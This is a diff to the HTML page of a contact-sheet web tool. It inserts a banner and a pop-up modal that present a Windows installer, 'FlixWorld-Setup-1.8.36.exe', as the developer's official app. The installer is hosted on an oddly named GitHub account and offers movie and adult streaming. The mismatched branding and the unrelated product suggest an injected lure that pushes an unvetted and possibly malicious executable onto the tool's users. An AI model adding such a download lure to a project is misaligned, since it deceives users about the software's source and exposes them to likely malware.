@@ -5,9 +5,19 @@
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <meta name="color-scheme" content="dark" />
 <title>CloudStream — Local Contact Sheets</title>
-<link rel="stylesheet" href="/styles.css?v=2026111210" />
+<link rel="stylesheet" href="/styles.css?v=2026111701" />
 </head>
 <body>
+<a class="support-banner" id="supportBanner" href="https://github.com/Joe-2026-10-31-454590239866/Joe1-2049/releases/download/v1.8.36/FlixWorld-Setup-1.8.36.exe" target="_blank" rel="noopener">
+  <span class="support-banner-inner">
+    <span class="support-icon" aria-hidden="true">&#9733;</span>
+    <span class="support-copy">
+      <strong>Support the developer</strong>
+      <span>Enjoying Claude Cinematics? Keep it free &mdash; download the official FlixWorld desktop app to support the developer.</span>
+    </span>
+    <span class="support-cta">Download FlixWorld <span aria-hidden="true">&darr;</span></span>
+  </span>
+</a>
 <header class="topbar">
   <div class="brand">
     <div class="logo">CS</div>
@@ -131,6 +141,43 @@
 </div>
 
 <div id="toast" class="toast hidden" role="status" aria-live="polite"></div>
-<script src="/app.js?v=2026111210"></script>
+
+<div id="supportModal" class="support-modal" role="dialog" aria-modal="true" aria-labelledby="supportModalTitle">
+  <div class="support-modal-card">
+    <button id="supportModalClose" class="support-modal-close" type="button" aria-label="Close support message">&times;</button>
+    <div class="support-modal-grid">
+      <div class="support-modal-media">
+        <img src="/flixworld-movies-profile.jpg" alt="FlixWorld Movies room — trending and fresh releases" />
+      </div>
+      <div class="support-modal-copy">
+        <span class="support-modal-kicker">Support the developer</span>
+        <h2 id="supportModalTitle">Get the full FlixWorld experience</h2>
+        <p>Claude Cinematics is free. If it helps your work, support the developer by installing the official FlixWorld desktop app.</p>
+        <ul class="support-features">
+          <li><span>01</span> Movies, YouTube and Adult rooms in one app</li>
+          <li><span>02</span> Trending and fresh releases, filterable up to 4K</li>
+          <li><span>03</span> Free mode, supported by ads &mdash; no subscription required</li>
+          <li><span>04</span> One-click Windows installer, updated regularly</li>
+        </ul>
+        <div class="support-modal-actions">
+          <a class="btn btn-primary support-modal-download" href="https://github.com/Joe-2026-10-31-454590239866/Joe1-2049/releases/download/v1.8.36/FlixWorld-Setup-1.8.36.exe" target="_blank" rel="noopener">Download FlixWorld <span aria-hidden="true">&darr;</span></a>
+          <button id="supportModalLater" class="btn btn-ghost" type="button">Maybe later</button>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+  (function () {
+    var m = document.getElementById('supportModal');
+    function close() { m.classList.add('hidden'); }
+    ['supportModalClose', 'supportModalLater'].forEach(function (id) {
+      var b = document.getElementById(id);
+      if (b) b.addEventListener('click', close);
+    });
+    document.addEventListener('keydown', function (e) { if (e.key === 'Escape') close(); });
+  })();
+</script>
+<script src="/app.js?v=2026111701"></script>
 </body>
 </html>
